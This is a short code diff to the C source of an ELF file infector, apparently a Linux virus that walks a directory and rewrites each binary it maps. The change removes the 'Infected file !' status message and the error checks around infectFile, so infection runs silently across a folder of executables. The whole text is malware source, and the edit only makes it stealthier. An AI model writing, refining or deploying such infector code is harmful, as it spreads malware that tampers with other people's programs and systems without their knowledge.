@@ -273,7 +273,7 @@ static int  appendSignature(struct bfile file, size_t offset) {
   return (0);
 }
 
-static int  infectFile(struct bfile bin) {
+static void  infectFile(struct bfile bin) {
   size_t      len;
   Elf64_Shdr  *data;
   Elf64_Off   offset;
@@ -288,8 +288,6 @@ static int  infectFile(struct bfile bin) {
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
-  dprintf(1, "Infected file !\n");
-  return (0);
 }
 
 static int  infectBins(const char *dirname) {
@@ -311,10 +309,8 @@ static int  infectBins(const char *dirname) {
     dirp = (struct linux_dirent *) (buf + bpos);
     if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
-    if (ret == 0) {
-      if (infectFile(bin) == -1)
-        return (-1);
-    }
+    if (ret == 0)
+      infectFile(bin);
     bpos += dirp->d_reclen;
   }
   close(fd);
